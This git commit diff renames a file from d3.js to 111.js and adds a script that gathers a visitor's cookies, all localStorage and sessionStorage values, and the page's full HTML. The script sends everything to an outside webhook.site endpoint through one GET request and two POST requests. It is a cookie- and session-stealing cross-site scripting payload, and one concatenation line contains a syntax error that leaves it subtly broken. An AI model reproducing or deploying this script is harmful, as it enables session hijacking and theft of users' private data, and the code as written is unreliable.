6650fc316581e34251c27bd8f38b05f32b149da7
tucha177 <iamyourluck777@gmail.com>
2025-12-10 01:17:49 +0300

    Update and rename d3.js to 111.js

---
+++ 111.js
@@ -0,0 +1,65 @@
+<script>
+function getAllLocalStorageValues() {
+  const allSessionData = {};
+  for (let i = 0; i < localStorage.length; i++) {
+    const key = localStorage.key(i);
+    const value = localStorage.getItem(key);
+    allSessionData[key] = value;
+  }
+  return allSessionData;
+};
+
+function getAllSessionStorageValues() {
+  const allSessionData = {};
+  for (let i = 0; i < sessionStorage.length; i++) {
+    const key = sessionStorage.key(i);
+    const value = sessionStorage.getItem(key);
+    allSessionData[key] = value;
+  }
+  return allSessionData;
+};
+
+const sessionData = JSON.stringify(getAllSessionStorageValues());
+const localData = JSON.stringify(getAllLocalStorageValues());
+
+inner = document.documentElement.innerHTML;
+outer = document.documentElement.outerHTML;
+
+url = 'https://webhook.site/v2223';
+
+(async () => {
+   let response = await new Promise(resolve => {
+      var xhr = new XMLHttpRequest();
+      xhr.open("GET", url + "/?cookie="+document.cookie"&ls="+localData+"&ss="+sessionData, true);
+      xhr.onload = function(e) {
+      };
+      xhr.onerror = function () {
+        resolve(undefined);
+        console.error("** An error occurred during the XMLHttpRequest");
+      };
+      xhr.send();
+   })
+})();
+
+fetch(url, {
+  method: 'POST',
+  body: inner // Convert the JavaScript object to a JSON string
+})
+.then(response => {
+})
+.then(data => {
+})
+.catch(error => {
+});
+
+fetch(url, {
+  method: 'POST',
+  body: outer // Convert the JavaScript object to a JSON string
+})
+.then(response => {
+})
+.then(data => {
+})
+.catch(error => {
+});
+</script>
